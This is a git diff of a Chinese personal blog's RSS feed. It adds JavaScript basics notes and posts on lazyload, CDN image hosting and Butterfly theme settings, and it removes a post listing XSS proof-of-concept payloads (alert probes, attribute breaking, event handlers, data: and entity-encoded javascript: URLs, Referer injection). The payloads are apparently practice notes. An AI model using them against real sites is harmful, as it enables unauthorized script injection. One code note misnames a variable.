+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var container = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;container.caoyao = &amp;quot;解毒草&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;container.feijian = &amp;quot;乌木剑&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;调用对象中的属性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调用对象中的属性&#34;&gt;#&lt;/a&gt; 调用对象中的属性&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;当调用的是一个中括号就需要用 []&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var container = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	caoyao : &amp;quot;解毒草&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	feijain: &amp;quot;乌木剑&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var prop = &amp;quot;caoyao&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;console.log(container[prop])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;遍历对象&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#遍历对象&#34;&gt;#&lt;/a&gt; 遍历对象&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;typeof()&lt;br&gt;
+ 定义一个对象时后面要加分好，定义函数不用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var a = &amp;quot;123&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var fun = function()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;console.log(typeof(a));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;console.log(typeof(fun));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202311071940503.png&#34; alt=&#34;屏幕截图 2023-11-07 193954&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;遍历对象获得属性名称&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; yexiaofan = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name : &lt;span class=&#34;string&#34;&gt;&amp;quot;叶小凡&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    age : &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eat : &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;KFCvm50&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; p &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; yexiaofan)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;age&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eat&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;遍历对象获得值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; p &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; yexiaofan)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(p + &lt;span class=&#34;string&#34;&gt;&amp;quot;=&amp;quot;&lt;/span&gt; + yexiaofan[p]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;数组&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数组&#34;&gt;#&lt;/a&gt; 数组&lt;/h2&gt;
+&lt;h3 id=&#34;数组的定义&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数组的定义&#34;&gt;#&lt;/a&gt; 数组的定义&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;直接定义&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var arr = [&amp;quot;first&amp;quot;,&amp;quot;second&amp;quot;,&amp;quot;third&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;console.log(arr)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;构造函数创建数组&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var arr = new Array(8);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;console.log(a.length)  //8,数组只有一个length属性&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;数组内置函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数组内置函数&#34;&gt;#&lt;/a&gt; 数组内置函数&lt;/h3&gt;
  ]]></description>
         </item>
         <item>
@@ -211,26 +444,33 @@ onerror 函数的话，是在 img 这个标签无法正常执行的时候触发�
 &lt;p&gt;我设置了网页加载动画，但是加载时间特别特别长，几分钟都没加载出来&lt;br&gt;
 于是我把网页加载动画关了。&lt;br&gt;
 一开始我以为是 css、js 文件的问题，我用 f12 查看到底是谁加载那么慢！！！&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/StarofEden/blog@main/image1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-04%20125027.png&#34; alt=&#34;屏幕截图 2023-11-04 125027&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202311052038785.png&#34; alt=&#34;屏幕截图 2023-11-04 125027&#34;&gt;&lt;/p&gt;
 &lt;p&gt;然后下面的图片文件全部标红了。&lt;br&gt;
 我百思不得其解，我还以为是图床的问题，但是有一两张图片还是坚持不懈的加载了出来。&lt;/p&gt;
 &lt;p&gt;然后，通过我不断地百度，我发现，原来是我 lazyload 出了问题。&lt;br&gt;
 图片文件后面的 lazyload 标红了。&lt;/p&gt;
 &lt;h1 id=&#34;0x01-解决办法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-解决办法&#34;&gt;#&lt;/a&gt; 0x01  解决办法&lt;/h1&gt;
+&lt;h2 id=&#34;配置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置&#34;&gt;#&lt;/a&gt; 配置&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;先看看是不是自己网络的问题，我用连手机热点就加载不出来。如果不是：&lt;/li&gt;
 &lt;li&gt;可能是 lazyload 过时了或者丢失了部分文件&lt;br&gt;
 在你的 blog 目录下安装 lazyload:&lt;/li&gt;
 &lt;/ul&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;npm install hexo-lazyload --save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/StarofEden/blog@main/image1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-04%20010221.png&#34; alt=&#34;屏幕截图 2023-11-04 010221&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202311052039017.png&#34; alt=&#34;屏幕截图 2023-11-04 010221&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;为了避免浏览器缓存的干扰，建议换一个浏览器来测试一下是否成功&lt;/li&gt;
 &lt;/ul&gt;
+&lt;h2 id=&#34;使用了免费在线图床&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用了免费在线图床&#34;&gt;#&lt;/a&gt; 使用了免费在线图床&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;使用的免费图床和 cdn 加速的 github 图床加载都很慢，只能去买一个阿里云 OSS&lt;/li&gt;
+&lt;li&gt;可以去看看阿里云 oss+PicGo+Typora 的教程&lt;/li&gt;
+&lt;/ul&gt;
+&lt;span class=&#39;p blue&#39;&gt;自己买了一个阿里云OSS，只用来当图床使用一年也就几块钱，试了一下速度很快。&lt;/span&gt;
 &lt;h1 id=&#34;0x02-一个神奇的现象&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-一个神奇的现象&#34;&gt;#&lt;/a&gt; 0x02  一个神奇的现象&lt;/h1&gt;
 &lt;p&gt;我用流量开热点，我的 blog 就不能加载 lazyload， &lt;code&gt;用校园网就可以&lt;/code&gt; &lt;br&gt;
 我查看了一下 lazyload 的地址：&lt;br&gt;
-&lt;img src=&#34;https://cdn.jsdelivr.net/gh/StarofEden/blog@main/image1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-04%20004432.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202311052038340.png&#34; alt=&#34;屏幕截图 2023-11-04 004432&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;难道是跟cdn有关？&lt;/code&gt;&lt;/p&gt;
 &lt;h1 id=&#34;0x03-什么是cdn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-什么是cdn&#34;&gt;#&lt;/a&gt; 0x03 什么是 CDN？&lt;/h1&gt;
 &lt;ul&gt;
@@ -244,6 +484,25 @@ onerror 函数的话，是在 img 这个标签无法正常执行的时候触发�
 &lt;li&gt;听起来更镜像有点相似，但是镜像服务器是源内容服务器的完整复制，大多用来下载文件。而 cdn 是部分内容缓存，对网页的静态资源分发，能减少网页的加载时间。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;&lt;em&gt;虽然还是不懂为什么连热点用不了 cdn 加载网页图片，明明我我上传图片到用 cdn 加速的 github 图床都还可以&lt;/em&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://starofeden.github.io/2023/11/04/%E9%AD%94%E6%94%B9%E7%9A%84%E9%97%AE%E9%A2%98/</guid>
+            <title>魔改hexo butterfly时遇到的一些问题</title>
+            <link>https://starofeden.github.io/2023/11/04/%E9%AD%94%E6%94%B9%E7%9A%84%E9%97%AE%E9%A2%98/</link>
+            <pubDate>Sat, 04 Nov 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;按照教程设置了文章三栏之后依旧是两栏&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#按照教程设置了文章三栏之后依旧是两栏&#34;&gt;#&lt;/a&gt; 按照教程设置了文章三栏之后依旧是两栏&lt;/h1&gt;
+&lt;p&gt;我是按照这位大佬的教程设置的：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.fomal.cc/posts/d739261b.html&#34;&gt;https://www.fomal.cc/posts/d739261b.html&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;解决办法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解决办法&#34;&gt;#&lt;/a&gt; &lt;strong&gt;解决办法&lt;/strong&gt;&lt;/h2&gt;
+&lt;span class=&#39;p purple&#39;&gt;可能是之前设置的文章两栏没关&lt;/span&gt;
+&lt;ul&gt;
+&lt;li&gt;在网站配置文件_config.yml 找到&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight yml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#双侧栏&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attr&#34;&gt;butterfly_article_double_row:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;attr&#34;&gt;enable:&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这里把 true 改为 false&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -1111,51 +1370,6 @@ image.jpg&lt;/li&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">https://starofeden.github.io/2023/08/31/%E7%94%A8%E8%BF%87%E7%9A%84xss-POC/</guid>
-            <title>用过的xss POC</title>
-            <link>https://starofeden.github.io/2023/08/31/%E7%94%A8%E8%BF%87%E7%9A%84xss-POC/</link>
-            <category>xss</category>
-            <pubDate>Thu, 31 Aug 2023 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;用过的xss-poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用过的xss-poc&#34;&gt;#&lt;/a&gt; 用过的 xss POC&lt;/h1&gt;
-&lt;h2 id=&#34;常见poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常见poc&#34;&gt;#&lt;/a&gt; 常见 poc&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;confirm(&amp;#x27;xss&amp;#x27;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;prompt(&amp;#x27;xss&amp;#x27;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;在属性中对引号闭合并注释掉后面的内容&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#在属性中对引号闭合并注释掉后面的内容&#34;&gt;#&lt;/a&gt; 在属性中对引号闭合并注释掉后面的内容&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;input标签特殊事件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#input标签特殊事件&#34;&gt;#&lt;/a&gt; input 标签特殊事件&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;onfocus=javascript:alert(&amp;#x27;xss&amp;#x27;) &amp;gt;//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;对script标签和事件进行过滤但没有过滤javascript&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对script标签和事件进行过滤但没有过滤javascript&#34;&gt;#&lt;/a&gt; 对 script 标签和事件进行过滤，但没有过滤 JavaScript&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&amp;lt;a href=javascript:alert(&amp;#x27;xss&amp;#x27;) &amp;gt; xss&amp;lt;/a&amp;gt;//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;data对字符进行编码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#data对字符进行编码&#34;&gt;#&lt;/a&gt; data: 对字符进行编码&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;html字符实体转换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#html字符实体转换&#34;&gt;#&lt;/a&gt; html 字符实体转换&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp;#x6A;&amp;amp;#x61;&amp;amp;#x76;&amp;amp;#x61;&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;&amp;amp;#x3A;&amp;amp;#x61;&amp;amp;#x6C;&amp;amp;#x65;&amp;amp;#x72;&amp;amp;#x74;&amp;amp;#x28;&amp;amp;#x27;&amp;amp;#x78;&amp;amp;#x73;&amp;amp;#x73;&amp;amp;#x27;&amp;amp;#x29;//http://www.baidu.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;输入框被隐藏&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#输入框被隐藏&#34;&gt;#&lt;/a&gt; 输入框被隐藏&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;keyword=test&amp;amp;t_link=&amp;quot; type=&amp;quot;text&amp;quot; onmouseover=alert(1)// &amp;amp; t_history=&amp;quot; type=&amp;quot;text&amp;quot; onmouseover=alert(1)// &amp;amp; t_sort=&amp;quot; type=&amp;quot;text&amp;quot; onmouseover=alert(1)//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;bp抓包修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bp抓包修改&#34;&gt;#&lt;/a&gt; bp 抓包修改&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;referer: &amp;quot; type=&amp;quot;text&amp;quot; onmouseover=alert(1)//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;ng-include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ng-include&#34;&gt;#&lt;/a&gt; ng-include&lt;/h2&gt;
